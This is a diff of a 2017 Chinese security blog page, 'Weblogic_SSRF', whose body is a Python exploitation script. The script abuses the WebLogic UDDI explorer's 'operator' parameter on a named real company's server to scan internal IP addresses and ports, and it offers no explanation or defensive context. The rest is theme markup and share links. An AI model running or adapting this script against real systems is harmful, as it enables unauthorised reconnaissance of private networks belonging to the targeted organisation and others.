@@ -1,3 +1,239 @@
-<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> Weblogic_SSRF · Z3R0YU</title><meta name="description" content="Weblogic_SSRF - z3r0yu"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://zer0yu.github.io/atom.xml" title="Z3R0YU"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="http://weibo.com/Z3r0yu" target="_blank" class="nav-list-link">WEIBO</a></li><li class="nav-list-item"><a href="https://github.com/zer0yu" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">Weblogic_SSRF</h1><div class="post-info">Jan 22, 2017</div><div class="post-content"><p>Weblogic_SSRF的一个利用脚本</p>
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Weblogic_SSRF的一个利用脚本
+123456789101112131415161718192021222324252627282930313233343536373839import sysimport requestsdef scan(ip_str):#元组ports = (&apos;21&apos;,&apos;22&apos;,&apos;23&apos;,&apos;53&apos;,&apos;80&apos;,&apos;135&apos;,&apos;139&apos;,&apos;443&apos;,&apos;445&apos;,&apos;1080&apos;,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Weblogic_SSRF">
+<meta property="og:url" content="http://zer0yu.github.io/2017/01/22/Weblogic-SSRF/index.html">
+<meta property="og:site_name" content="Z3R0YU">
+<meta property="og:description" content="Weblogic_SSRF的一个利用脚本
+123456789101112131415161718192021222324252627282930313233343536373839import sysimport requestsdef scan(ip_str):#元组ports = (&apos;21&apos;,&apos;22&apos;,&apos;23&apos;,&apos;53&apos;,&apos;80&apos;,&apos;135&apos;,&apos;139&apos;,&apos;443&apos;,&apos;445&apos;,&apos;1080&apos;,">
+<meta property="og:updated_time" content="2017-01-22T02:45:33.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Weblogic_SSRF">
+<meta name="twitter:description" content="Weblogic_SSRF的一个利用脚本
+123456789101112131415161718192021222324252627282930313233343536373839import sysimport requestsdef scan(ip_str):#元组ports = (&apos;21&apos;,&apos;22&apos;,&apos;23&apos;,&apos;53&apos;,&apos;80&apos;,&apos;135&apos;,&apos;139&apos;,&apos;443&apos;,&apos;445&apos;,&apos;1080&apos;,">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Weblogic_SSRF</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Z3R0YU" type="application/atom+xml" />
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2017/01/22/Linux下使用锐捷的方法/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2017/01/22/CTF中那些有趣的混淆/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2017/01/22/Weblogic-SSRF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2017/01/22/Weblogic-SSRF/&text=Weblogic_SSRF"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2017/01/22/Weblogic-SSRF/&title=Weblogic_SSRF"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2017/01/22/Weblogic-SSRF/&is_video=false&description=Weblogic_SSRF"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Weblogic_SSRF&body=Check out this article: http://zer0yu.github.io/2017/01/22/Weblogic-SSRF/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2017/01/22/Weblogic-SSRF/&title=Weblogic_SSRF"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2017/01/22/Weblogic-SSRF/&title=Weblogic_SSRF"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2017/01/22/Weblogic-SSRF/&title=Weblogic_SSRF"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2017/01/22/Weblogic-SSRF/&title=Weblogic_SSRF"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2017/01/22/Weblogic-SSRF/&name=Weblogic_SSRF&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Weblogic_SSRF
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Z3R0YU</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2017-01-22T02:44:43.000Z" itemprop="datePublished">2017-01-22</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>Weblogic_SSRF的一个利用脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(ip_str)</span>:</span></div><div class="line"><span class="comment">#元组</span></div><div class="line">ports = (<span class="string">'21'</span>,<span class="string">'22'</span>,<span class="string">'23'</span>,<span class="string">'53'</span>,<span class="string">'80'</span>,<span class="string">'135'</span>,<span class="string">'139'</span>,<span class="string">'443'</span>,<span class="string">'445'</span>,<span class="string">'1080'</span>,<span class="string">'1433'</span>,<span class="string">'1521'</span>,<span class="string">'3306'</span>,<span class="string">'3389'</span>,<span class="string">'4899'</span>,<span class="string">'8080'</span>,<span class="string">'7001'</span>,<span class="string">'8000'</span>,)</div><div class="line"></div><div class="line"><span class="keyword">for</span> port <span class="keyword">in</span> ports:</div><div class="line"><span class="comment"># %d 是整形通配符,%s是字符串通配符</span></div><div class="line">exp_url = <span class="string">"http://www.faw.com.cn/uddiexplorer/SetupUDDIExplorer.jsp?operator=http://%s:%s&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search"</span>%(ip_str,port)</div><div class="line"></div><div class="line"><span class="keyword">try</span>:</div><div class="line"></div><div class="line">response = requests.get(exp_url, timeout=<span class="number">1</span>, verify=<span class="keyword">False</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">'weblogic.uddi.client.structures.exception.XML_SoapException'</span> <span class="keyword">in</span> response.content:</div><div class="line"></div><div class="line"><span class="keyword">print</span> ip_str+<span class="string">':'</span> + port + <span class="string">' --open'</span></div><div class="line"></div><div class="line"><span class="keyword">except</span> Exception, e:</div><div class="line"></div><div class="line"><span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_ip</span><span class="params">(ip_prefix)</span>:</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">190</span>,<span class="number">200</span>):</div><div class="line"></div><div class="line">scan(<span class="string">'%s.%s'</span>%(ip_prefix,i))</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line"></div><div class="line">commandargs = sys.argv[<span class="number">1</span>]</div><div class="line"></div><div class="line">args = <span class="string">""</span>.join(commandargs)<span class="comment">#将列表数据以‘’中的字符链接</span></div><div class="line"></div><div class="line">ip_prefix = <span class="string">'.'</span>.join(args.split(<span class="string">'.'</span>)[:<span class="number">-1</span>])</div><div class="line"></div><div class="line">find_ip(ip_prefix)</div></pre></td></tr></table></figure>
-</div></article></div></main><footer><div class="paginator"><a href="/2017/01/22/Linux下使用锐捷的方法/" class="prev">PREV</a><a href="/2017/01/22/CTF中那些有趣的混淆/" class="next">NEXT</a></div><div class="copyright"><p>© 2015 - 2018 <a href="http://zer0yu.github.io">z3r0yu</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-65933410-1",'auto');ga('send','pageview');</script></body></html>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2017/01/22/Weblogic-SSRF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2017/01/22/Weblogic-SSRF/&text=Weblogic_SSRF"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2017/01/22/Weblogic-SSRF/&title=Weblogic_SSRF"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2017/01/22/Weblogic-SSRF/&is_video=false&description=Weblogic_SSRF"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Weblogic_SSRF&body=Check out this article: http://zer0yu.github.io/2017/01/22/Weblogic-SSRF/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2017/01/22/Weblogic-SSRF/&title=Weblogic_SSRF"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2017/01/22/Weblogic-SSRF/&title=Weblogic_SSRF"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2017/01/22/Weblogic-SSRF/&title=Weblogic_SSRF"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2017/01/22/Weblogic-SSRF/&title=Weblogic_SSRF"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2017/01/22/Weblogic-SSRF/&name=Weblogic_SSRF&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 z3r0yu
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
